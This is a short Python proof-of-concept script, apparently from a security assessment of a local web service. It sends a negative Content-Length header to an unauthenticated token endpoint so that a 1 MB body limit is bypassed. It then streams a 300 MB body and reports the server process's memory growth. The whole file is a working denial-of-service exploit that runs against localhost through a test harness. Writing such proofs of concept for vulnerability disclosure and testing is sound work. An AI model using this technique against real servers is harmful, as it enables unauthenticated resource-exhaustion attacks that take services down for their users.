"""PoC 4: Content-Length: -1 bypasses the 1 MB body limit; unauthenticated on POST /api/auth/token."""
import resource, socket, time
from harness import *  # noqa

svc = service()
api = Api(svc)
port = api.server.server_port


def rss_mb():
    with open("/proc/self/status") as f:
        for line in f:
            if line.startswith("VmRSS"):
                return int(line.split()[1]) / 1024


def send(cl, body_len, path="/api/auth/token", auth=None):
    s = socket.create_connection(("127.0.0.1", port))
    hdr = f"POST {path} HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: {cl}\r\n"
    if auth:
        hdr += f"Authorization: Bearer {auth}\r\n"
    s.sendall((hdr + "\r\n").encode())
    chunk = b" " * (1 << 20)
    sent = 0
    while sent < body_len:
        s.sendall(chunk)
        sent += len(chunk)
    s.sendall(b"{}")
    s.shutdown(socket.SHUT_WR)
    data = b""
    while True:
        d = s.recv(65536)
        if not d:
            break
        data += d
    s.close()
    return data.split(b"\r\n", 1)[0].decode(), data.rsplit(b"\r\n\r\n", 1)[-1][:120]


print("control: Content-Length 2000000 ->", send(2_000_000, 0))
before = rss_mb()
t = time.time()
print("attack: Content-Length -1 with 300 MB body, no token ->", send(-1, 300 << 20))
print(f"RSS before {before:.0f} MB, peak RSS {resource.getrusage(resource.RUSAGE_SELF).ru_maxrss/1024:.0f} MB, "
      f"took {time.time()-t:.1f}s")
